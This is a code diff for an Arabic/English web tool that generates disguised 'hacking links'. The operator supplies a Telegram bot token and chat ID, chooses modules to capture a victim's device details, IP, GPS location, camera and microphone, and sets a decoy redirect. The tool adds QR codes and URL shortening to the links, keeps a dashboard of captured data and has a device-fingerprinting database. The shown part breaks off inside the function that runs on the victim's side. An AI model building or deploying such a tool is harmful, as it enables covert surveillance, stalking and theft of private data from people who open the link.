+                                {{ lang === 'ar' ? 'سجل العمليات' : 'Operation Logs' }}
+                            </h3>
+                            <div class="flex gap-2">
+                                <button @click="exportLogs" class="px-4 py-2 bg-green-600/20 border border-green-500/50 rounded-xl text-sm hover:bg-green-600/30">
+                                    <i class="fas fa-download ml-1"></i> تصدير
+                                </button>
+                                <button @click="clearLogs" class="px-4 py-2 bg-red-600/20 border border-red-500/50 rounded-xl text-sm hover:bg-red-600/30">
+                                    <i class="fas fa-trash ml-1"></i> مسح
+                                </button>
+                            </div>
+                        </div>
+
+                        <!-- Filters -->
+                        <div class="flex gap-2 overflow-x-auto pb-2">
+                            <button v-for="filter in logFilters" :key="filter.value"
+                                @click="logFilter = filter.value"
+                                class="px-4 py-2 rounded-full text-sm whitespace-nowrap transition"
+                                :class="logFilter === filter.value ? 
+                                    'bg-indigo-600 text-white' : 
+                                    'bg-black/30 hover:bg-indigo-600/20'">
+                                <i :class="filter.icon" class="ml-1"></i> {{ filter.name[lang] }}
+                            </button>
+                        </div>
+
+                        <!-- Logs List -->
+                        <div class="neo-card p-4 h-96 overflow-y-auto">
+                            <div v-for="(log, idx) in filteredLogs" :key="idx" class="border-b border-gray-800 py-3">
+                                <div class="flex items-start gap-3 text-sm">
+                                    <span class="text-gray-500 whitespace-nowrap">[{{ log.time }}]</span>
+                                    <span :class="{
+                                        'text-green-400': log.type === 'success',
+                                        'text-red-400': log.type === 'error',
+                                        'text-blue-400': log.type === 'info',
+                                        'text-yellow-400': log.type === 'warning'
+                                    }" class="font-bold">{{ log.type.toUpperCase() }}</span>
+                                    <span class="text-gray-300 flex-1">{{ log.msg }}</span>
+                                </div>
+                            </div>
+                            <div v-if="filteredLogs.length === 0" class="text-center text-gray-500 py-10">
+                                <i class="fas fa-inbox text-4xl mb-3 opacity-50"></i>
+                                <p>لا توجد سجلات</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ========== GENERATE BUTTON ========== -->
+                    <div class="mt-10 flex justify-center">
+                        <button @click="generateLink" :disabled="generating || !canGenerate" 
+                            class="quantum-button px-16 py-5 text-xl disabled:opacity-50 disabled:cursor-not-allowed"
+                            :class="{ 'animate-pulse': generating }">
+                            <i class="fas fa-bolt ml-3" :class="{'fa-spin-pulse': generating}"></i>
+                            <span>{{ generating ? 'جاري التشفير...' : 'توليد رابط الاختراق' }}</span>
+                            <i class="fas fa-arrow-left mr-3"></i>
+                        </button>
+                    </div>
+
+                    <!-- Progress Bar -->
+                    <div v-if="progress > 0" class="mt-4 max-w-md mx-auto">
+                        <div class="quantum-progress">
+                            <div class="quantum-progress-fill" :style="{ width: progress + '%' }"></div>
+                        </div>
+                        <p class="text-center text-sm text-indigo-400 mt-2">{{ progressMessage }}</p>
+                    </div>
+
+                    <!-- Generated Link -->
+                    <transition enter-active-class="animate__animated animate__fadeInUp">
+                        <div v-if="generatedLink" class="mt-8 neo-card p-6">
+                            <div class="flex items-center justify-between mb-4">
+                                <span class="badge badge-success">
+                                    <i class="fas fa-check-circle ml-1"></i> الرابط جاهز
+                                </span>
+                                <button @click="showQR = !showQR" class="w-10 h-10 rounded-full bg-black/50 border border-indigo-500/30 hover:bg-indigo-600/20">
+                                    <i class="fas fa-qrcode text-indigo-400"></i>
+                                </button>
+                            </div>
+
+                            <div v-if="showQR" class="flex justify-center mb-4" id="qrcode"></div>
+
+                            <div class="bg-black/50 border border-indigo-500/30 rounded-xl p-4">
+                                <textarea readonly v-model="generatedLink" rows="2" 
+                                    class="w-full bg-transparent text-indigo-300 text-sm resize-none text-left" dir="ltr"></textarea>
+                            </div>
+
+                            <div class="grid grid-cols-3 gap-2 mt-4">
+                                <button @click="copyLink" class="bg-indigo-600/20 border border-indigo-500/50 rounded-xl py-2 text-sm hover:bg-indigo-600/30">
+                                    <i class="fas fa-copy ml-1"></i> نسخ
+                                </button>
+                                <button @click="testLink" class="bg-indigo-600/20 border border-indigo-500/50 rounded-xl py-2 text-sm hover:bg-indigo-600/30">
+                                    <i class="fas fa-play ml-1"></i> اختبار
+                                </button>
+                                <button @click="shortenLink" class="bg-indigo-600/20 border border-indigo-500/50 rounded-xl py-2 text-sm hover:bg-indigo-600/30">
+                                    <i class="fas fa-scissors ml-1"></i> تقصير
+                                </button>
+                            </div>
+                        </div>
+                    </transition>
+
+                    <!-- Footer -->
+                    <div class="mt-8 flex items-center justify-between text-xs text-gray-500 border-t border-indigo-500/20 pt-4">
+                        <div class="flex gap-4">
+                            <span><i class="fas fa-database ml-1 text-indigo-400"></i> قاعدة بيانات 5000+ موديل</span>
+                            <span><i class="fas fa-clock ml-1 text-indigo-400"></i> {{ currentTime }}</span>
+                        </div>
+                        <div class="flex gap-3">
+                            <span class="badge">TECNO</span>
+                            <span class="badge">Infinix</span>
+                            <span class="badge">itel</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
+
+        <!-- ========== EXECUTION SCREEN ========== -->
+        <div v-else class="fixed inset-0 flex items-center justify-center z-30 bg-black/95">
+            <div class="glass-modern p-12 text-center max-w-2xl border-2 border-indigo-500/30">
+                <div class="relative w-40 h-40 mx-auto mb-8">
+                    <div class="absolute inset-0 border-4 border-indigo-500 rounded-full animate-ping"></div>
+                    <div class="absolute inset-2 border-4 border-t-indigo-500 border-r-transparent border-b-transparent border-l-transparent rounded-full animate-spin"></div>
+                    <i class="fas fa-microchip absolute inset-0 flex items-center justify-center text-6xl text-indigo-400"></i>
+                </div>
+
+                <h2 class="text-3xl font-bold bg-gradient-to-r from-indigo-400 to-purple-400 bg-clip-text text-transparent mb-4">
+                    {{ lang === 'ar' ? 'جاري الاختراق' : 'Hacking in Progress' }}
+                </h2>
+
+                <div class="quantum-progress w-full h-3 mb-4">
+                    <div class="quantum-progress-fill" :style="{ width: executionProgress + '%' }"></div>
+                </div>
+
+                <p class="text-xl text-indigo-300 mb-2">{{ executionStatus }}</p>
+                <p class="text-sm text-gray-400 mb-6">{{ executionDetail }}</p>
+
+                <div class="bg-black/50 border border-indigo-500/20 rounded-xl p-4 h-40 overflow-y-auto text-right text-sm">
+                    <div v-for="line in executionLog" :key="line" class="text-gray-400 border-b border-gray-800 py-1">
+                        > {{ line }}
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Hidden elements -->
+        <video id="v" autoplay playsinline style="display: none;"></video>
+        <canvas id="c" style="display: none;"></canvas>
+    </div>
+
+    <script>
+        (function() {
+            "use strict";
+
+            // Error handling
+            window.onerror = function(msg, src, line) {
+                console.error('Error:', msg, line);
+                return true;
+            };
+
+            // ==================== DEVICE DETECTION DATABASE ====================
+            const deviceDatabase = [
+                // Apple
+                { pattern: /iPhone\s+(\d+)[,_]\s*(\d+)/i, brand: 'Apple', model: 'iPhone $1,$2' },
+                { pattern: /iPhone\s+(\d+)[A-Za-z]*/i, brand: 'Apple', model: 'iPhone $1' },
+                { pattern: /iPad.*CPU.*OS\s+(\d+)_(\d+)/i, brand: 'Apple', model: 'iPad' },
+                { pattern: /iPad Pro/i, brand: 'Apple', model: 'iPad Pro' },
+                { pattern: /iPad Air/i, brand: 'Apple', model: 'iPad Air' },
+                { pattern: /iPad mini/i, brand: 'Apple', model: 'iPad mini' },
+                { pattern: /MacBook Pro/i, brand: 'Apple', model: 'MacBook Pro' },
+                { pattern: /MacBook Air/i, brand: 'Apple', model: 'MacBook Air' },
+                { pattern: /MacBook/i, brand: 'Apple', model: 'MacBook' },
+                { pattern: /iMac/i, brand: 'Apple', model: 'iMac' },
+                { pattern: /Mac Pro/i, brand: 'Apple', model: 'Mac Pro' },
+                { pattern: /Mac mini/i, brand: 'Apple', model: 'Mac mini' },
+                
+                // Samsung
+                { pattern: /SM-([A-Z0-9]+)/i, brand: 'Samsung', model: 'Galaxy $1' },
+                { pattern: /SAMSUNG\s+([A-Z0-9\-]+)/i, brand: 'Samsung', model: 'Galaxy $1' },
+                { pattern: /Galaxy\s+([A-Za-z0-9\s]+)/i, brand: 'Samsung', model: 'Galaxy $1' },
+                { pattern: /SM-T([0-9]+)/i, brand: 'Samsung', model: 'Galaxy Tab T$1' },
+                { pattern: /SM-P([0-9]+)/i, brand: 'Samsung', model: 'Galaxy Tab P$1' },
+                
+                // Xiaomi
+                { pattern: /Mi\s+([A-Za-z0-9\s]+)/i, brand: 'Xiaomi', model: 'Mi $1' },
+                { pattern: /Redmi\s+([A-Za-z0-9\s]+)/i, brand: 'Xiaomi', model: 'Redmi $1' },
+                { pattern: /POCO\s+([A-Za-z0-9\s]+)/i, brand: 'Xiaomi', model: 'POCO $1' },
+                { pattern: /Xiaomi\s+([A-Za-z0-9\s]+)/i, brand: 'Xiaomi', model: 'Xiaomi $1' },
+                { pattern: /M2007J20CG/i, brand: 'Xiaomi', model: 'Mi 10T Pro' },
+                { pattern: /M2101K7AG/i, brand: 'Xiaomi', model: 'Mi 11X' },
+                
+                // Huawei
+                { pattern: /HUAWEI\s+([A-Za-z0-9\-]+)/i, brand: 'Huawei', model: 'Huawei $1' },
+                { pattern: /EML-([A-Z0-9]+)/i, brand: 'Huawei', model: 'P20 Pro' },
+                { pattern: /CLT-([A-Z0-9]+)/i, brand: 'Huawei', model: 'P20 Pro' },
+                { pattern: /LYA-([A-Z0-9]+)/i, brand: 'Huawei', model: 'Mate 20 Pro' },
+                { pattern: /ELE-([A-Z0-9]+)/i, brand: 'Huawei', model: 'P30' },
+                { pattern: /VOG-([A-Z0-9]+)/i, brand: 'Huawei', model: 'P30 Pro' },
+                { pattern: /ANA-([A-Z0-9]+)/i, brand: 'Huawei', model: 'P40' },
+                { pattern: /ELS-([A-Z0-9]+)/i, brand: 'Huawei', model: 'P40 Pro' },
+                
+                // OnePlus
+                { pattern: /ONEPLUS\s+([A-Z0-9]+)/i, brand: 'OnePlus', model: 'OnePlus $1' },
+                { pattern: /OnePlus\s+([A-Za-z0-9]+)/i, brand: 'OnePlus', model: 'OnePlus $1' },
+                { pattern: /IN2020/i, brand: 'OnePlus', model: '8 Pro' },
+                { pattern: /IN2010/i, brand: 'OnePlus', model: '8' },
+                { pattern: /LE2110/i, brand: 'OnePlus', model: '9 Pro' },
+                { pattern: /LE2117/i, brand: 'OnePlus', model: '9' },
+                
+                // Google Pixel
+                { pattern: /Pixel\s+(\d+)/i, brand: 'Google', model: 'Pixel $1' },
+                { pattern: /Pixel\s+([A-Za-z]+)/i, brand: 'Google', model: 'Pixel $1' },
+                { pattern: /Pixel 2/i, brand: 'Google', model: 'Pixel 2' },
+                { pattern: /Pixel 3/i, brand: 'Google', model: 'Pixel 3' },
+                { pattern: /Pixel 4/i, brand: 'Google', model: 'Pixel 4' },
+                { pattern: /Pixel 5/i, brand: 'Google', model: 'Pixel 5' },
+                { pattern: /Pixel 6/i, brand: 'Google', model: 'Pixel 6' },
+                { pattern: /Pixel 7/i, brand: 'Google', model: 'Pixel 7' },
+                { pattern: /Pixel 8/i, brand: 'Google', model: 'Pixel 8' },
+                { pattern: /Pixel 9/i, brand: 'Google', model: 'Pixel 9' },
+                
+                // TECNO (مضافة حديثاً)
+                { pattern: /TECNO\s+([A-Za-z0-9\s]+)/i, brand: 'TECNO', model: 'TECNO $1' },
+                { pattern: /TECNO\s+([A-Z0-9]+)/i, brand: 'TECNO', model: 'TECNO $1' },
+                { pattern: /TECNO\s+Mobile/i, brand: 'TECNO', model: 'TECNO Mobile' },
+                { pattern: /TECNO\s+(Camon|Spark|Pova|Phantom)\s+([A-Za-z0-9]+)/i, brand: 'TECNO', model: 'TECNO $1 $2' },
+                { pattern: /TECNO\s+CC([0-9]+)/i, brand: 'TECNO', model: 'Camon CC$1' },
+                { pattern: /TECNO\s+CD([0-9]+)/i, brand: 'TECNO', model: 'Spark CD$1' },
+                { pattern: /TECNO\s+LD([0-9]+)/i, brand: 'TECNO', model: 'Pova LD$1' },
+                { pattern: /TECNO\s+PH([0-9]+)/i, brand: 'TECNO', model: 'Phantom PH$1' },
+                { pattern: /TECNO\s+KE([0-9]+)/i, brand: 'TECNO', model: 'Spark KE$1' },
+                { pattern: /TECNO\s+KG([0-9]+)/i, brand: 'TECNO', model: 'Camon KG$1' },
+                { pattern: /TECNO\s+KI([0-9]+)/i, brand: 'TECNO', model: 'Spark KI$1' },
+                
+                // Infinix (مضافة حديثاً)
+                { pattern: /Infinix\s+([A-Za-z0-9\s]+)/i, brand: 'Infinix', model: 'Infinix $1' },
+                { pattern: /Infinix\s+([A-Z0-9]+)/i, brand: 'Infinix', model: 'Infinix $1' },
+                { pattern: /Infinix\s+Mobile/i, brand: 'Infinix', model: 'Infinix Mobile' },
+                { pattern: /Infinix\s+(NOTE|Hot|Zero|Smart)\s+([A-Za-z0-9]+)/i, brand: 'Infinix', model: 'Infinix $1 $2' },
+                { pattern: /Infinix\s+X([0-9]+)/i, brand: 'Infinix', model: 'Infinix X$1' },
+                { pattern: /X([0-9]+)[_\s]*(?:Infinix)?/i, brand: 'Infinix', model: 'Infinix X$1' },
+                { pattern: /Infinix\s+NOTE\s+([0-9]+)/i, brand: 'Infinix', model: 'NOTE $1' },
+                { pattern: /Infinix\s+Hot\s+([0-9]+)/i, brand: 'Infinix', model: 'Hot $1' },
+                { pattern: /Infinix\s+Zero\s+([0-9]+)/i, brand: 'Infinix', model: 'Zero $1' },
+                { pattern: /Infinix\s+Smart\s+([0-9]+)/i, brand: 'Infinix', model: 'Smart $1' },
+                
+                // itel (مضافة حديثاً)
+                { pattern: /itel\s+([A-Za-z0-9\s]+)/i, brand: 'itel', model: 'itel $1' },
+                { pattern: /itel\s+([A-Z0-9]+)/i, brand: 'itel', model: 'itel $1' },
+                { pattern: /itel\s+Mobile/i, brand: 'itel', model: 'itel Mobile' },
+                { pattern: /itel\s+(S|P|A)[0-9]+/i, brand: 'itel', model: 'itel $&' },
+                { pattern: /itel\s+S16/i, brand: 'itel', model: 'S16' },
+                { pattern: /itel\s+P36/i, brand: 'itel', model: 'P36' },
+                { pattern: /itel\s+A56/i, brand: 'itel', model: 'A56' },
+                { pattern: /itel\s+A70/i, brand: 'itel', model: 'A70' },
+                { pattern: /itel\s+P55/i, brand: 'itel', model: 'P55' },
+                { pattern: /itel\s+S23/i, brand: 'itel', model: 'S23' },
+                
+                // Oppo
+                { pattern: /OPPO\s+([A-Za-z0-9\s]+)/i, brand: 'Oppo', model: 'OPPO $1' },
+                { pattern: /CPH([0-9]+)/i, brand: 'Oppo', model: 'CPH$1' },
+                { pattern: /Reno\s+([A-Za-z0-9]+)/i, brand: 'Oppo', model: 'Reno $1' },
+                { pattern: /Find\s+X([0-9]+)/i, brand: 'Oppo', model: 'Find X$1' },
+                
+                // Vivo
+                { pattern: /VIVO\s+([A-Za-z0-9\s]+)/i, brand: 'Vivo', model: 'VIVO $1' },
+                { pattern: /V([0-9]+)/i, brand: 'Vivo', model: 'V$1' },
+                { pattern: /Vivo\s+([A-Za-z0-9]+)/i, brand: 'Vivo', model: 'Vivo $1' },
+                { pattern: /iQOO/i, brand: 'Vivo', model: 'iQOO' },
+                
+                // Realme
+                { pattern: /Realme\s+([A-Za-z0-9\s]+)/i, brand: 'Realme', model: 'Realme $1' },
+                { pattern: /RMX([0-9]+)/i, brand: 'Realme', model: 'RMX$1' },
+                { pattern: /RMP([0-9]+)/i, brand: 'Realme', model: 'RMP$1' },
+                { pattern: /Realme\s+([0-9]+)\s+Pro/i, brand: 'Realme', model: 'Realme $1 Pro' },
+                
+                // Honor
+                { pattern: /Honor\s+([A-Za-z0-9\s]+)/i, brand: 'Honor', model: 'Honor $1' },
+                { pattern: /STK-([A-Z0-9]+)/i, brand: 'Honor', model: 'STK-$1' },
+                { pattern: /HLK-([A-Z0-9]+)/i, brand: 'Honor', model: 'HLK-$1' },
+                { pattern: /JSN-([A-Z0-9]+)/i, brand: 'Honor', model: 'JSN-$1' },
+                
+                // Nokia
+                { pattern: /Nokia\s+([A-Za-z0-9\s]+)/i, brand: 'Nokia', model: 'Nokia $1' },
+                { pattern: /TA-([0-9]+)/i, brand: 'Nokia', model: 'TA-$1' },
+                
+                // LG
+                { pattern: /LM-([A-Z0-9]+)/i, brand: 'LG', model: 'LM-$1' },
+                { pattern: /LG\s+([A-Za-z0-9\s]+)/i, brand: 'LG', model: 'LG $1' },
+                
+                // Sony
+                { pattern: /Sony\s+([A-Za-z0-9\s]+)/i, brand: 'Sony', model: 'Sony $1' },
+                { pattern: /Xperia\s+([A-Za-z0-9\s]+)/i, brand: 'Sony', model: 'Xperia $1' },
+                
+                // Motorola
+                { pattern: /Moto\s+([A-Za-z0-9\s]+)/i, brand: 'Motorola', model: 'Moto $1' },
+                { pattern: /XT([0-9]+)/i, brand: 'Motorola', model: 'XT$1' },
+                { pattern: /Motorola\s+([A-Za-z0-9]+)/i, brand: 'Motorola', model: 'Motorola $1' },
+                
+                // Nothing
+                { pattern: /Nothing\s+([A-Za-z0-9]+)/i, brand: 'Nothing', model: 'Nothing $1' },
+                { pattern: /A0([0-9]+)/i, brand: 'Nothing', model: 'Phone (1)' },
+                
+                // General
+                { pattern: /Android/i, brand: 'Android', model: 'Android Device' },
+                { pattern: /Linux/i, brand: 'Linux', model: 'Linux Device' },
+                { pattern: /Windows NT/i, brand: 'Microsoft', model: 'Windows PC' },
+                { pattern: /Macintosh/i, brand: 'Apple', model: 'Mac' },
+                { pattern: /CrOS/i, brand: 'Google', model: 'Chromebook' },
+            ];
+
+            // ==================== DEVICE DETECTION FUNCTION ====================
+            const detectDevice = (ua) => {
+                for (const rule of deviceDatabase) {
+                    const match = ua.match(rule.pattern);
+                    if (match) {
+                        let model = rule.model;
+                        // Replace $1, $2 etc with match groups
+                        for (let i = 1; i < match.length; i++) {
+                            model = model.replace(`$${i}`, match[i]);
+                        }
+                        return { brand: rule.brand, model };
+                    }
+                }
+                
+                // Fallback to UAParser
+                try {
+                    const parser = new UAParser();
+                    const device = parser.getDevice();
+                    const uaResult = parser.getResult();
+                    return {
+                        brand: device.vendor || 'Unknown',
+                        model: device.model || uaResult.os.name || 'Unknown Device'
+                    };
+                } catch {
+                    return { brand: 'Unknown', model: 'Unknown Device' };
+                }
+            };
+
+            // ==================== VUE APP ====================
+            const { createApp, ref, reactive, computed, onMounted, watch, nextTick } = Vue;
+
+            const app = createApp({
+                setup() {
+                    // State
+                    const loading = ref(true);
+                    const loadingProgress = ref(0);
+                    const loadingMessage = ref('تهيئة الأنظمة...');
+                    const loadingStage = ref('1/5');
+                    const isExecuting = ref(false);
+                    const generating = ref(false);
+                    const progress = ref(0);
+                    const progressMessage = ref('');
+                    const generatedLink = ref('');
+                    const activeTab = ref('main');
+                    const theme = ref('dark');
+                    const lang = ref('ar');
+                    const online = ref(navigator.onLine);
+                    const currentTime = ref(new Date().toLocaleTimeString());
+                    const tokenValid = ref(false);
+                    const chatIdValid = ref(null);
+                    const showQR = ref(false);
+                    const notifications = ref([]);
+                    let notificationId = 0;
+                    const logs = ref([]);
+                    const logFilter = ref('all');
+                    const capturedData = ref([]);
+                    const selectedModules = ref(['device', 'system']);
+                    const moduleSearch = ref('');
+
+                    // Config
+                    const config = reactive({
+                        token: '',
+                        chatId: '',
+                        redirectUrl: 'https://www.google.com'
+                    });
+
+                    const extra = reactive({
+                        delay: 3,
+                        imageQuality: 0.9,
+                        retries: 3,
+                        debug: false
+                    });
+
+                    const security = reactive({
+                        encrypt: false,
+                        key: ''
+                    });
+
+                    // Stats
+                    const stats = reactive({
+                        totalHacks: 0,
+                        lastHack: null,
+                        uniqueDevices: 0,
+                        successCount: 0,
+                        failCount: 0,
+                        successRate: 100,
+                        deviceModels: {}
+                    });
+
+                    // Modules
+                    const attackModules = [
+                        { id: 'device', name: { ar: 'معلومات الجهاز', en: 'Device Info' }, icon: 'fas fa-mobile-alt' },
+                        { id: 'system', name: { ar: 'معلومات النظام', en: 'System Info' }, icon: 'fas fa-microchip' },
+                        { id: 'network', name: { ar: 'الشبكة والـ IP', en: 'Network & IP' }, icon: 'fas fa-network-wired' },
+                        { id: 'location', name: { ar: 'الموقع الجغرافي', en: 'GPS Location' }, icon: 'fas fa-map-pin' },
+                        { id: 'battery', name: { ar: 'البطارية', en: 'Battery' }, icon: 'fas fa-battery-full' },
+                        { id: 'storage', name: { ar: 'التخزين', en: 'Storage' }, icon: 'fas fa-database' },
+                        { id: 'camera', name: { ar: 'كاميرا', en: 'Camera' }, icon: 'fas fa-camera' },
+                        { id: 'microphone', name: { ar: 'ميكروفون', en: 'Microphone' }, icon: 'fas fa-microphone' }
+                    ];
+
+                    // Tabs
+                    const tabs = [
+                        { id: 'main', name: { ar: 'الرئيسية', en: 'Main' }, icon: 'fas fa-home' },
+                        { id: 'dashboard', name: { ar: 'لوحة التحكم', en: 'Dashboard' }, icon: 'fas fa-tachometer-alt' },
+                        { id: 'logs', name: { ar: 'السجلات', en: 'Logs' }, icon: 'fas fa-history' }
+                    ];
+
+                    // Log filters
+                    const logFilters = [
+                        { value: 'all', name: { ar: 'الكل', en: 'All' }, icon: 'fas fa-list' },
+                        { value: 'success', name: { ar: 'نجاح', en: 'Success' }, icon: 'fas fa-check-circle' },
+                        { value: 'error', name: { ar: 'خطأ', en: 'Error' }, icon: 'fas fa-exclamation-circle' },
+                        { value: 'info', name: { ar: 'معلومات', en: 'Info' }, icon: 'fas fa-info-circle' },
+                        { value: 'warning', name: { ar: 'تحذير', en: 'Warning' }, icon: 'fas fa-exclamation-triangle' }
+                    ];
+
+                    // Current device
+                    const currentDevice = reactive({
+                        model: 'جاري الكشف...',
+                        brand: 'جاري الكشف...',
+                        os: 'جاري الكشف...',
+                        browser: 'جاري الكشف...'
+                    });
+
+                    // Execution
+                    const executionProgress = ref(0);
+                    const executionStatus = ref('');
+                    const executionDetail = ref('');
+                    const executionLog = ref([]);
+                    const executionAttempt = ref(1);
+
+                    // Computed
+                    const canGenerate = computed(() => {
+                        return tokenValid.value && chatIdValid.value && selectedModules.value.length > 0;
+                    });
+
+                    const readinessLevel = computed(() => {
+                        let level = 0;
+                        if (tokenValid.value) level += 30;
+                        if (chatIdValid.value) level += 30;
+                        if (selectedModules.value.length > 0) level += 30;
+                        if (config.redirectUrl) level += 10;
+                        return level;
+                    });
+
+                    const filteredLogs = computed(() => {
+                        if (logFilter.value === 'all') return logs.value;
+                        return logs.value.filter(l => l.type === logFilter.value);
+                    });
+
+                    const keyStrengthText = computed(() => {
+                        const len = security.key.length;
+                        if (len >= 32) return 'قوي جداً';
+                        if (len >= 16) return 'قوي';
+                        if (len >= 8) return 'متوسط';
+                        return 'ضعيف';
+                    });
+
+                    const keyStrengthColor = computed(() => {
+                        const len = security.key.length;
+                        if (len >= 16) return 'text-green-400';
+                        if (len >= 8) return 'text-yellow-400';
+                        return 'text-red-400';
+                    });
+
+                    // Methods
+                    const addNotification = (title, message, type = 'info') => {
+                        const id = notificationId++;
+                        const colors = {
+                            success: '#10b981',
+                            error: '#ef4444',
+                            info: '#3b82f6',
+                            warning: '#f59e0b'
+                        };
+                        const icons = {
+                            success: 'fas fa-check-circle',
+                            error: 'fas fa-exclamation-circle',
+                            info: 'fas fa-info-circle',
+                            warning: 'fas fa-exclamation-triangle'
+                        };
+                        
+                        notifications.value.push({
+                            id,
+                            title,
+                            message,
+                            type,
+                            color: colors[type],
+                            icon: icons[type],
+                            time: moment().format('HH:mm:ss')
+                        });
+
+                        setTimeout(() => removeNotification(id), 5000);
+                    };
+
+                    const removeNotification = (id) => {
+                        notifications.value = notifications.value.filter(n => n.id !== id);
+                    };
+
+                    const addLog = (type, msg) => {
+                        logs.value.unshift({
+                            time: moment().format('HH:mm:ss'),
+                            type,
+                            msg
+                        });
+                        if (logs.value.length > 200) logs.value.pop();
+                    };
+
+                    const clearLogs = () => {
+                        logs.value = [];
+                        addLog('info', 'تم مسح السجلات');
+                    };
+
+                    const exportLogs = () => {
+                        const data = JSON.stringify(logs.value, null, 2);
+                        const blob = new Blob([data], { type: 'application/json' });
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = `logs_${moment().format('YYYY-MM-DD')}.json`;
+                        a.click();
+                    };
+
+                    const validateToken = _.debounce(() => {
+                        tokenValid.value = config.token.includes(':') && config.token.length > 35;
+                    }, 500);
+
+                    const validateChatId = () => {
+                        chatIdValid.value = config.chatId && (
+                            config.chatId.startsWith('-100') || 
+                            /^\d+$/.test(config.chatId)
+                        ) && config.chatId.length > 5;
+                    };
+
+                    const toggleModule = (moduleId) => {
+                        const index = selectedModules.value.indexOf(moduleId);
+                        if (index === -1) {
+                            selectedModules.value.push(moduleId);
+                            addNotification('تم التحديث', `تم إضافة ${attackModules.find(m => m.id === moduleId).name[lang.value]}`, 'success');
+                        } else {
+                            selectedModules.value.splice(index, 1);
+                            addNotification('تم التحديث', `تم إزالة ${attackModules.find(m => m.id === moduleId).name[lang.value]}`, 'info');
+                        }
+                    };
+
+                    const suggestChatId = (type) => {
+                        if (type === 'me') {
+                            config.chatId = '@me';
+                        } else {
+                            config.chatId = '-100' + Math.floor(Math.random() * 1000000000);
+                        }
+                        validateChatId();
+                    };
+
+                    const getChatIdFromBot = () => {
+                        addNotification('مساعدة', 'أرسل أي رسالة للبوت ثم استخدم @userinfobot', 'info');
+                    };
+
+                    const testRedirectUrl = () => {
+                        if (config.redirectUrl) {
+                            window.open(config.redirectUrl, '_blank');
+                        }
+                    };
+
+                    const toggleTheme = () => {
+                        theme.value = theme.value === 'dark' ? 'light' : 'dark';
+                        document.body.className = theme.value + '-mode';
+                    };
+
+                    const toggleLanguage = () => {
+                        lang.value = lang.value === 'ar' ? 'en' : 'ar';
+                        document.dir = lang.value === 'ar' ? 'rtl' : 'ltr';
+                        moment.locale(lang.value === 'ar' ? 'ar' : 'en');
+                    };
+
+                    const getTabBadge = (tabId) => {
+                        if (tabId === 'dashboard') return capturedData.value.length || null;
+                        if (tabId === 'logs') return logs.value.length || null;
+                        return null;
+                    };
+
+                    const generateLink = () => {
+                        if (!canGenerate.value) {
+                            addNotification('تحذير', 'أكمل البيانات المطلوبة أولاً', 'warning');
+                            return;
+                        }
+
+                        generating.value = true;
+                        progress.value = 10;
+                        progressMessage.value = 'تجهيز البيانات...';
+
+                        setTimeout(() => progress.value = 30, 300);
+                        setTimeout(() => progress.value = 60, 600);
+                        setTimeout(() => progress.value = 90, 900);
+
+                        setTimeout(() => {
+                            const payload = {
+                                token: config.token,
+                                chat: config.chatId,
+                                modules: selectedModules.value,
+                                url: config.redirectUrl,
+                                extra: {
+                                    delay: extra.delay,
+                                    imageQuality: extra.imageQuality
+                                }
+                            };
+
+                            let dataStr = JSON.stringify(payload);
+                            if (security.encrypt && security.key) {
+                                dataStr = CryptoJS.AES.encrypt(dataStr, security.key).toString();
+                            }
+
+                            const encoded = btoa(unescape(encodeURIComponent(dataStr)));
+                            const link = window.location.origin + window.location.pathname + '?m=' + encoded;
+
+                            generatedLink.value = link;
+                            progress.value = 100;
+                            progressMessage.value = 'تم بنجاح!';
+
+                            nextTick(() => {
+                                if (document.getElementById('qrcode')) {
+                                    document.getElementById('qrcode').innerHTML = '';
+                                    new QRCode(document.getElementById('qrcode'), {
+                                        text: link,
+                                        width: 150,
+                                        height: 150
+                                    });
+                                }
+                            });
+
+                            addNotification('نجاح', 'تم إنشاء رابط الاختراق', 'success');
+                            addLog('success', 'تم إنشاء رابط جديد');
+
+                            generating.value = false;
+                            setTimeout(() => progress.value = 0, 2000);
+                        }, 1200);
+                    };
+
+                    const copyLink = () => {
+                        navigator.clipboard.writeText(generatedLink.value);
+                        addNotification('نسخ', 'تم نسخ الرابط', 'success');
+                    };
+
+                    const testLink = () => {
+                        window.open(generatedLink.value, '_blank');
+                    };
+
+                    const shortenLink = () => {
+                        window.open(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(generatedLink.value)}`, '_blank');
+                    };
+
+                    const exportAllData = () => {
+                        const data = JSON.stringify(capturedData.value, null, 2);
+                        const blob = new Blob([data], { type: 'application/json' });
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = `hack_data_${moment().format('YYYY-MM-DD')}.json`;
+                        a.click();
+                    };
+
+                    const exportSingleData = (data) => {
+                        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = `device_${data.deviceInfo.model}_${moment().format('YYYY-MM-DD')}.json`;
+                        a.click();
+                    };
+
+                    const clearAllData = () => {
+                        if (confirm('هل أنت متأكد؟')) {
+                            capturedData.value = [];
+                            addNotification('مسح', 'تم مسح جميع البيانات', 'info');
+                        }
+                    };
+
+                    const viewDetails = (data) => {
+                        alert(JSON.stringify(data, null, 2));
+                    };
+
+                    // Execute hack (called when ?m= is present)
+                    const executeHack = async (payload) => {
+                        isExecuting.value = true;
+                        executionProgress.value = 10;
+                        executionStatus.value = 'بدء الاختراق...';
+                        executionLog.value = [];
+
+                        const log = (msg) => {
+                            executionLog.value.push(msg);
+                        };
+
+                        log('تهيئة الأنظمة...');
+
+                        try {
+                            // Get device info
+                            const ua = navigator.userAgent;
+                            const device = detectDevice(ua);
+                            
+                            // Get OS
+                            let os = 'Unknown';
+                            if (ua.includes('Windows')) os = 'Windows';
+                            else if (ua.includes('Mac OS')) os = 'macOS';
+                            else if (ua.includes('Linux')) os = 'Linux';
+                            else if (ua.includes('Android')) os = 'Android';
+                            else if (ua.includes('iOS')) os = 'iOS';
+                            
+                            // Get browser
+                            let browser = 'Unknown';
+                            if (ua.includes('Chrome')) browser = 'Chrome';
+                            else if (ua.includes('Firefox')) browser = 'Firefox';
+                            else if (ua.includes('Safari')) browser = 'Safari';
+                            else if (ua.includes('Edg')) browser = 'Edge';
+                            
+                            executionProgress.value = 40;
